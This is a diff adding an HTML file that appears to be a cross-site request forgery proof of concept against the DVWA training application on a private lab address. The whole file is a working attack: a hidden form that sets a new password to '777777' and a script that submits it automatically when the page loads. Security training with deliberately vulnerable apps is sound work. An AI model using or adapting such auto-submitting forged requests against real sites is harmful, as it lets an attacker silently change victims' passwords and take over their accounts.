@@ -1,0 +1,10 @@
+<form id="form1" action="http://172.16.88.150/dvwa/vulnerabilities/csrf/" method="GET">   
+    <input type="hidden" autocomplete="off" name="password_new" value="777777">
+    <input type="hidden" autocomplete="off" name="password_conf" value="777777">
+    <input value="Change" name="Change" type="hidden">
+</form>
+
+
+<script>
+	document.getElementById('form1').submit();
+</script>
